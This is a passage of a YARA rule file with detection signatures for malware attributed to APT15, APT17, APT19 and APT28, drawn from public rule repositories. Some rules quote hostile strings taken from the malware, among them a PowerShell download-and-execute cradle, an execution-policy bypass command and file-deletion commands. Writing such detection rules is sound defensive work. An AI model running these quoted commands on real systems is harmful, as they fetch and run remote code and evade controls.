\"%s~clitemp%08x.tmp\" fullword\n        $string5 = \"hkcmd.exe\" fullword\n        $string6 = \"myWObject\" fullword\n\n    condition:\n        uint16(0) == 0x5A4D and 2 of them\n}\n\nrule APT15_malware_apt15_royaldll\n{\n    meta:\n        description = \"DLL implant; runs as a service\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_apt15_royaldll\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $opcodes_jshash = { B8 A7 C6 67 4E 83 C1 02 BA 04 00 00 00 57 90 }\n        $opcodes_encode = { 0F B6 1C 03 8B 55 08 30 1C 17 47 3B 7D 0C }\n        $opcodes_sleep_loop = { 68 (88|B8) (13|0B) 00 00 FF D6 4F 75 F6 }\n        $ = \"Nwsapagent\" fullword\n        $ = \"\\\"%s\\\">>\\\"%s\\\"\\\\s.txt\"\n        $ = \"myWObject\" fullword\n        $ = \"del c:\\\\windows\\\\temp\\\\r.exe /f /q\"\n        $ = \"del c:\\\\windows\\\\temp\\\\r.ini /f /q\"\n\n    condition:\n        3 of them\n}\n\nrule APT15_malware_apt15_royaldll_2\n{\n    meta:\n        description = \"DNS backdoor used by APT15\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Ahmed Zaki\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_apt15_royaldll_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost\" wide ascii\n        $ = \"netsvcs\" wide ascii fullword\n        $ = \"%SystemRoot%\\\\System32\\\\svchost.exe -k netsvcs\" wide ascii fullword\n        $ = \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\\" wide ascii\n        $ = \"myWObject\" wide ascii\n\n    condition:\n        uint16(0) == 0x5A4D and all of them and pe.exports(\"ServiceMain\") and filesize > 50KB and filesize < 600KB\n}\n\nrule APT15_malware_apt15_exchange_tool\n{\n    meta:\n        description = \"Exchange enumeration/hijacking tool used by APT15\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Ahmed Zaki\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_apt15_exchange_tool\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"subjectname\" fullword\n        $s2 = \"sendername\" fullword\n        $s3 = \"WebCredentials\" fullword\n        $s4 = \"ExchangeVersion\" fullword\n        $s5 = \"ExchangeCredentials\" fullword\n        $s6 = \"slfilename\" fullword\n        $s7 = \"EnumMail\" fullword\n        $s8 = \"EnumFolder\" fullword\n        $s9 = \"set_Credentials\" fullword\n        $s10 = \"/de\" wide\n        $s11 = \"/sn\" wide\n        $s12 = \"/sbn\" wide\n        $s13 = \"/list\" wide\n        $s14 = \"/enum\" wide\n        $s15 = \"/save\" wide\n        $s16 = \"/ao\" wide\n        $s17 = \"/sl\" wide\n        $s18 = \"/v or /t is null\" wide\n        $s19 = \"2007\" wide\n        $s20 = \"2010\" wide\n        $s21 = \"2010sp1\" wide\n        $s22 = \"2010sp2\" wide\n        $s23 = \"2013\" wide\n        $s24 = \"2013sp1\" wide\n\n    condition:\n        uint16(0) == 0x5A4D and 15 of ($s*)\n}\n\nrule APT15_malware_apt15_generic\n{\n    meta:\n        description = \"Indicators relating to AP15 tools\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2018/march/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"David Cannings\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"malware_apt15_generic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $str01 = \"myWObject\" fullword\n        $str02 = \"myRObject\" fullword\n        $opcodes01 = { 6A (02|03) 6A 00 6A 00 68 00 00 00 C0 50 FF 15 }\n\n    condition:\n        2 of them\n}\n\nrule APT15_Malware_Mar18_RoyalCli\n{\n    meta:\n        description = \"Malware from APT15 report by NCC Group\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://goo.gl/HZ5XMN\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT15_Malware_Mar18_RoyalCli\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\RoyalCli.pdb\" ascii\n        $s2 = \"%snewcmd.exe\" fullword ascii\n        $s3 = \"Run cmd error %d\" fullword ascii\n        $s4 = \"%s~clitemp%08x.ini\" fullword ascii\n        $s5 = \"run file failed\" fullword ascii\n        $s6 = \"Cmd timeout %d\" fullword ascii\n        $s7 = \"2 %s  %d 0 %d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and 2 of them\n}\n\nrule APT15_Malware_Mar18_RoyalDNS\n{\n    meta:\n        description = \"Malware from APT15 report by NCC Group\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://goo.gl/HZ5XMN\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT15_Malware_Mar18_RoyalDNS\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"del c:\\\\windows\\\\temp\\\\r.exe /f /q\" fullword ascii\n        $x2 = \"%s\\\\r.exe\" fullword ascii\n        $s1 = \"rights.dll\" fullword ascii\n        $s2 = \"\\\"%s\\\">>\\\"%s\\\"\\\\s.txt\" fullword ascii\n        $s3 = \"Nwsapagent\" fullword ascii\n        $s4 = \"%s\\\\r.bat\" fullword ascii\n        $s5 = \"%s\\\\s.txt\" fullword ascii\n        $s6 = \"runexe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and ((pe.exports(\"RunInstallA\") and pe.exports(\"RunUninstallA\")) or 1 of ($x*) or 2 of them)\n}\n\nrule APT15_Malware_Mar18_BS2005\n{\n    meta:\n        description = \"Malware from APT15 report by NCC Group\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://goo.gl/HZ5XMN\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT15_Malware_Mar18_BS2005\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"AAAAKQAASCMAABi+AABnhEBj8vep7VRoAEPRWLweGc0/eiDrXGajJXRxbXsTXAcZAABK4QAAPWwAACzWAAByrg==\" fullword ascii\n        $x2 = \"AAAAKQAASCMAABi+AABnhKv3kXJJousn5YzkjGF46eE3G8ZGse4B9uoqJo8Q2oF0AABK4QAAPWwAACzWAAByrg==\" fullword ascii\n        $a1 = \"http://%s/content.html?id=%s\" fullword ascii\n        $a2 = \"http://%s/main.php?ssid=%s\" fullword ascii\n        $a3 = \"http://%s/webmail.php?id=%s\" fullword ascii\n        $a9 = \"http://%s/error.html?tab=%s\" fullword ascii\n        $s1 = \"%s\\\\~tmp.txt\" fullword ascii\n        $s2 = \"%s /C %s >>\\\"%s\\\" 2>&1\" fullword ascii\n        $s3 = \"DisableFirstRunCustomize\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 200KB and (1 of ($x*) or 2 of them)\n}\n\nrule APT15_Malware_Mar18_MSExchangeTool\n{\n    meta:\n        description = \"Malware from APT15 report by NCC Group\"\n        threat_names = \"RoyalCli, APT15\"\n        ref = \"https://goo.gl/HZ5XMN\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT15_Malware_Mar18_MSExchangeTool\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\Release\\\\EWSTEW.pdb\" ascii\n        $s2 = \"EWSTEW.exe\" fullword wide\n        $s3 = \"Microsoft.Exchange.WebServices.Data\" fullword ascii\n        $s4 = \"tmp.dat\" fullword wide\n        $s6 = \"/v or /t is null\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule APT17_Sample_FXSST_DLL\n{\n    meta:\n        description = \"Samples related to APT17 activity\"\n        threat_names = \"APT17\"\n        ref = \"https://goo.gl/ZiJyQv\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT17_Sample_FXSST_DLL\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Microsoft? Windows? Operating System\" fullword wide\n        $x2 = \"fxsst.dll\" fullword ascii\n        $y1 = \"DllRegisterServer\" fullword ascii\n        $y2 = \".cSV\" fullword ascii\n        $s1 = \"GetLastActivePopup\"\n        $s2 = \"Sleep\"\n        $s3 = \"GetModuleFileName\"\n        $s4 = \"VirtualProtect\"\n        $s5 = \"HeapAlloc\"\n        $s6 = \"GetProcessHeap\"\n        $s7 = \"GetCommandLine\"\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 800KB and (all of ($x*) or all of ($y*)) and all of ($s*)\n}\n\nrule APT17_Malware_Oct17_1\n{\n    meta:\n        description = \"APT17 malware\"\n        threat_names = \"APT17\"\n        ref = \"https://goo.gl/puVc9q\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT17_Malware_Oct17_1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"\\\\spool\\\\prtprocs\\\\w32x86\\\\localspl.dll\" fullword ascii\n        $s2 = \"\\\\spool\\\\prtprocs\\\\x64\\\\localspl.dll\" fullword ascii\n        $s3 = \"\\\\msvcrt.dll\" fullword ascii\n        $s4 = \"\\\\TSMSISrv.dll\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 500KB and all of them)\n}\n\nrule APT17_Malware_Oct17_2\n{\n    meta:\n        description = \"APT17 malware\"\n        threat_names = \"APT17\"\n        ref = \"https://goo.gl/puVc9q\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT17_Malware_Oct17_2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Cookie: __xsptplus=%s\" fullword ascii\n        $x2 = \"http://services.fiveemotions.co.jp\" fullword ascii\n        $x3 = \"http://%s/ja-JP/2015/%d/%d/%d%d%d%d%d%d%d%d.gif\" fullword ascii\n        $s1 = \"FoxHTTPClient_EXE_x86.exe\" fullword ascii\n        $s2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3072\" ascii\n        $s3 = \"hWritePipe2 Error:%d\" fullword ascii\n        $s4 = \"Not Support This Function!\" fullword ascii\n        $s5 = \"Global\\\\PnP_No_Management\" fullword ascii\n        $s6 = \"Content-Type: image/x-png\" fullword ascii\n        $s7 = \"Accept-Language: ja-JP\" fullword ascii\n        $s8 = \"IISCMD Error:%d\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and (pe.exports(\"_foo@0\") or 1 of ($x*) or 6 of them)\n}\n\nrule APT17_Unsigned_Symantec_Binary_EFA\n{\n    meta:\n        description = \"APT17 malware\"\n        threat_names = \"APT17\"\n        ref = \"https://goo.gl/puVc9q\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT17_Unsigned_Symantec_Binary_EFA\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Copyright (c) 2007 - 2011 Symantec Corporation\" fullword wide\n        $s2 = \"\\\\\\\\.\\\\SYMEFA\" fullword wide\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and all of them and pe.number_of_signatures == 0)\n}\n\nrule APT17_Malware_Oct17_Gen\n{\n    meta:\n        description = \"APT17 malware\"\n        threat_names = \"APT17\"\n        ref = \"https://goo.gl/puVc9q\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT17_Malware_Oct17_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NETCLR 2.0.50727)\" fullword ascii\n        $x2 = \"http://%s/imgres?q=A380&hl=en-US&sa=X&biw=1440&bih=809&tbm=isus&tbnid=aLW4-J8Q1lmYBM\" ascii\n        $s1 = \"hWritePipe2 Error:%d\" fullword ascii\n        $s2 = \"Not Support This Function!\" fullword ascii\n        $s3 = \"Cookie: SESSIONID=%s\" fullword ascii\n        $s4 = \"http://0.0.0.0/1\" fullword ascii\n        $s5 = \"Content-Type: image/x-png\" fullword ascii\n        $s6 = \"Accept-Language: en-US\" fullword ascii\n        $s7 = \"IISCMD Error:%d\" fullword ascii\n        $s8 = \"[IISEND=0x%08X][Recv:] 0x%08X %s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and (pe.imphash() == \"414bbd566b700ea021cfae3ad8f4d9b9\" or 1 of ($x*) or 6 of them))\n}\n\nrule APT19_Beacon_K5om\n{\n    meta:\n        description = \"Meterpreter Beacon\"\n        threat_names = \"Meterpreter\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2017/06/phished-at-the-request-of-counsel.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"Beacon_K5om\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n        $x2 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n        $x3 = \"%d is an x86 process (can't inject x64 content)\" fullword ascii\n        $s1 = \"Could not open process token: %d (%u)\" fullword ascii\n        $s2 = \"0fd00b.dll\" fullword ascii\n        $s3 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n        $s4 = \"Could not connect to pipe (%s): %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and (1 of ($x*) or 3 of them))\n}\n\nrule APT19_FE_LEGALSTRIKE_RTF\n{\n    meta:\n        description = \"RTF Phishing Campaign leveraging the CVE 2017-0199 exploit\"\n        threat_names = \"APT19\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"joshua.kim@FireEye. - modified by Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"FE_LEGALSTRIKE_RTF\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $lnkinfo = \"4c0069006e006b0049006e0066006f\"\n        $encoded1 = \"4f4c45324c696e6b\"\n        $encoded2 = \"52006f006f007400200045006e007400720079\"\n        $encoded3 = \"4f0062006a0049006e0066006f\"\n        $encoded4 = \"4f006c0065\"\n        $datastore = \"\\\\*\\\\datastore\"\n\n    condition:\n        uint32be(0) == 0x7B5C7274 and all of them\n}\n\nrule APT28_CHOPSTICK\n{\n    meta:\n        description = \"Malware that behaves like CHOPSTICK mentioned in APT28 report\"\n        threat_names = \"CHOPSTICK, APT28\"\n        ref = \"https://goo.gl/v3ebal\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT28_CHOPSTICK\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"jhuhugit.tmp\" fullword ascii\n        $s8 = \"KERNEL32.dll\" fullword ascii\n        $s9 = \"IsDebuggerPresent\" fullword ascii\n        $s10 = \"IsProcessorFeaturePresent\" fullword ascii\n        $s11 = \"TerminateProcess\" fullword ascii\n        $s13 = \"DeleteFileA\" fullword ascii\n        $s15 = \"GetProcessHeap\" fullword ascii\n        $s16 = \"!This program cannot be run in DOS mode.\" fullword ascii\n        $s17 = \"LoadLibraryA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 722KB and all of them\n}\n\nrule APT28_SourFace_Malware1\n{\n    meta:\n        description = \"SOURFACE downloader: malware from APT28 incident\"\n        threat_names = \"SOURFACE, APT28\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT28_SourFace_Malware1\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"coreshell.dll\" fullword wide\n        $s1 = \"Core Shell Runtime Service\" fullword wide\n        $s2 = \"\\\\chkdbg.log\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 62KB and all of them\n}\n\nrule APT28_SourFace_Malware2\n{\n    meta:\n        description = \"SOURFACE downloader: malware from APT28 incident\"\n        threat_names = \"SOURFACE, APT28\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT28_SourFace_Malware2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"coreshell.dll\" fullword ascii\n        $s1 = \"Applicate\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule APT28_SourFace_Malware3\n{\n    meta:\n        description = \"SOURFACE downloader: malware from APT28 incident\"\n        threat_names = \"SOURFACE, APT28\"\n        ref = \"https://www.fireeye.com/blog/threat-research/2014/10/apt28-a-window-into-russias-cyber-espionage-operations.html\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"APT28_SourFace_Malware3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"coreshell.dll\" fullword wide\n        $s1 = \"Core Shell Runtime Service\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 550KB and all of them\n}\n\nrule APT28_IMPLANT_1_v1\n{\n    meta:\n        description = \"DownRange Implant by APT28\"\n        threat_names = \"DownRange, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_1_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {6A ?? E8 ?? ?? FF FF 59 85 C0 74 0B 8B C8 E8 ?? ?? FF FF 8B F0\n         EB 02 33 F6 8B CE E8 ?? ?? FF FF 85 F6 74 0E 8B CE E8 ?? ?? FF FF 56\n         E8 ?? ?? FF FF 59}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_1_v2\n{\n    meta:\n        description = \"DownRange Implant by APT28\"\n        threat_names = \"DownRange, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_1_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = {83 3E 00 53 74 4F 8B 46 04 85 C0 74 48 83 C0 02 50 E8 ?? ?? 00\n         00 8B D8 59 85 DB 74 38 8B 4E 04 83 F9 FF 7E 21 57 }\n        $STR2 = {55 8B EC 8B 45 08 3B 41 08 72 04 32 C0 EB 1B 8B 49 04 8B 04 81\n         80 78 19 01 75 0D FF 70 10 FF [5] 85 C0 74 E3 }\n\n    condition:\n        (uint16(0) == 0x5A4D) and any of them\n}\n\nrule APT28_IMPLANT_1_v3\n{\n    meta:\n        description = \"DownRange Implant by APT28\"\n        threat_names = \"DownRange, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_1_v3\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $rol7encode = { 0F B7 C9 C1 C0 07 83 C2 02 33 C1 0F B7 0A 47 66 85 C9 75 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and all of them\n}\n\nrule APT28_IMPLANT_1_v4\n{\n    meta:\n        description = \"DownRange Implant by APT28\"\n        threat_names = \"DownRange, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_1_v4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $XOR_LOOP = { 8B 45 FC 8D 0C 06 33 D2 6A 0B 8B C6 5B F7 F3 8A 82 ?? ??\n         ?? ?? 32 04 0F 46 88 01 3B 75 0C 7C E0 }\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_1_v5\n{\n    meta:\n        description = \"DownRange Implant by APT28\"\n        threat_names = \"DownRange, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_1_v5\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $drivername = { 6A 30 ?? 6A 33 [5] 6A 37 [5] 6A 32 [5] 6A 31 [5] 6A 77\n         [5] 6A 69 [5] 6A 6E [5] 6A 2E [5] 6A 73 [5-9] 6A 79 [5] 6A 73 }\n        $mutexname = { C7 45 ?? 2F 2F 64 66 C7 45 ?? 63 30 31 65 C7 45 ?? 6C 6C\n         36 7A C7 45 ?? 73 71 33 2D C7 45 ?? 75 66 68 68 66 C7 45 ?? 66 }\n\n    condition:\n        (uint16(0) == 0x5A4D or uint16(0) == 0xCFD0 or uint16(0) == 0xC3D4 or uint32(0) == 0x46445025 or uint32(1) == 0x6674725C) and any of them\n}\n\nrule APT28_IMPLANT_1_v7\n{\n    meta:\n        description = \"DownRange Implant by APT28\"\n        threat_names = \"DownRange, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_1_v7\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $XOR_FUNCT = { C7 45 ?? ?? ?? 00 10 8B 0E 6A ?? FF 75 ?? E8 ?? ?? FF FF }\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v1\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 8d ?? fa [2] e8 [2] FF FF C7 [2-5] 00 00 00 00 8D [2-5] 5? 6a 00 6a 01}\n\n    condition:\n        (uint16(0) == 0x5A4D) and all of them\n}\n\nrule APT28_IMPLANT_2_v2\n{\n    meta:\n        description = \"CORESHELL/SOURFACE Implant by APT28\"\n        threat_names = \"CORESHELL/SOURFACE, APT28\"\n        ref = \"https://www.us-cert.gov/ncas/current-activity/2017/02/10/Enhanced-Analysis-GRIZZLY-STEPPE\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US CERT\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"IMPLANT_2_v2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $STR1 = { 83 ?? 06 [7-17] fa [0-10] 45 [2-4] 48 